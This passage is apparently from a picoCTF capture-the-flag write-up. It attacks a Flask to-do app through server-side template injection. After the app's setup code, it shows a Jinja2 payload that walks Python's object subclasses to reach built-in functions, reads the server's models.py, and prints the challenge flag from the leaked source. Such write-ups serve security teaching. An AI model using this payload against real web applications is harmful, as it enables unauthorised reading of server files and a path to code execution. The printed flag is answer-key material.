app = Flask(__name__)
app.config.from_object(Config)
db = SQLAlchemy(app)
login = LoginManager(app)
login.login_view = 'login'
bootstrap=Bootstrap(app)
from app import routes,models
def DB_init(db):
    db.drop_all()
    db.create_all()
    u = models.User(username='jarrett.booz',password_hash='deadbeef',id=1,admin=0,secret='Likes Oreos.', name="Jarrett Booz")
    db.session.add(u)
    u = models.User(username='danny.tunitis',password_hash='deadbeef',id=2,admin=0,secret='Know it all.', name= "Danny Tunitis")
    db.session.add(u)
    c = models.Todo(item='Shrink the moon', user_id=1)
    db.session.add(c)
    c = models.Todo(item='Grab the moon', user_id=1)
    db.session.add(c)
    c = models.Todo(item='Sit on the toilet', user_id=1)
    db.session.add(c)
    db.session.commit()
try:
    DB_init(db)
    scheduler = BackgroundScheduler()
    scheduler.add_job(func=DB_init,args=(db,),trigger="interval",hours=2)
    scheduler.start()
    atexit.register(lambda: scheduler.shutdown())
except Exception as e:
    print(e)
(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'models.py')).read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'models.py')).read()}}'
from app import db,login
from werkzeug.security import generate_password_hash,check_password_hash
from flask_login import UserMixin
@login.user_loader
def load_user(id):
    return User.query.get(int(id))
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64),index=True,unique=True)
    name = db.Column(db.String(128))
    password_hash = db.Column(db.String(128))
    secret = db.Column(db.String(128),default="picoCTF{its_a_me_your_flag5c0e0ae8}")
    admin = db.Column(db.Integer,default=0)
    def set_password(self,password):
        self.password_hash = generate_password_hash(password)
    def check_password(self,password):
        return check_password_hash(self.password_hash,password)
    def __repr__(self):
        return ''.format(self.username)
class Todo(db.Model):
    id = db.Column(db.Integer,primary_key=True)
    item = db.Column(db.String(256))
    user_id = db.Column(db.Integer,db.ForeignKey('user.id'))
    def __repr__(self):
        return ''.format(self.id)
```
We can see that the flag is located in the source of `models.py`: `picoCTF{its_a_me_your_flag5c0e0ae8}`. Since it is inserted into the DB, this might be an unintended solution.
## Additional Solutions
Two more ways to solve the challenge, based on other writeups: